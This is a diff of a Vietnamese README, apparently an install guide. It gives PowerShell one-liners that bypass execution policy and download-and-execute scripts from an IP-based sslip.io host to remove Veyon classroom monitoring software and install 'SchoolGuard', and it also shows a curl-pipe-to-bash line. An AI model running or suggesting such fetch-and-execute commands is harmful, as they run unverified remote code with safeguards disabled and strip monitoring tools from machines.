@@ -56,19 +56,14 @@ curl -sSL http://192.168.1.154:8888/go | bash
 
 Bấm **`Win + R`** (hoặc mở **PowerShell** / **CMD**), bấm biểu tượng **Copy** ở góc phải khung lệnh bên dưới rồi dán vào và nhấn **Enter**:
 
-### 1. Lệnh Gộp 2-Trong-1 Trên Windows: Xóa sạch Veyon + Cài đặt SchoolGuard (Khuyên dùng)
+### 1. Lệnh Gộp 1-Click Trên Windows: Tắt Veyon + Cài đặt SchoolGuard (Khuyên dùng)
 ```powershell
-powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$w=New-Object Net.WebClient;$f1=Join-Path $env:TEMP 'xoa_veyon.bat';$f2=Join-Path $env:TEMP 'sg_setup.bat';$w.DownloadFile('https://103-149-172-179.sslip.io/Xoa-Sach-Veyon-Windows.bat',$f1);& $f1;$w.DownloadFile('https://103-149-172-179.sslip.io/Cai-Dat-SchoolGuard-Windows.bat',$f2);& $f2"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iex((New-Object Net.WebClient).DownloadString('https://103-149-172-179.sslip.io/win'))"
 ```
 
-### 2. Lệnh Chỉ Cài Đặt SchoolGuard Trên Windows (Không cần cài Python)
+### 2. Lệnh Chỉ Xóa Sạch Veyon Trên Windows (Gỡ hoàn toàn)
 ```powershell
-powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$f=Join-Path $env:TEMP 'sg_setup.bat';(New-Object Net.WebClient).DownloadFile('https://103-149-172-179.sslip.io/Cai-Dat-SchoolGuard-Windows.bat',$f);& $f"
-```
-
-### 3. Lệnh Chỉ Tắt Hẳn & Xóa Sạch Veyon Trên Windows
-```powershell
-powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$f=Join-Path $env:TEMP 'xoa_veyon.bat';(New-Object Net.WebClient).DownloadFile('https://103-149-172-179.sslip.io/Xoa-Sach-Veyon-Windows.bat',$f);& $f"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iex((New-Object Net.WebClient).DownloadString('https://103-149-172-179.sslip.io/remove_veyon_win.ps1'))"
 ```
 
 ---
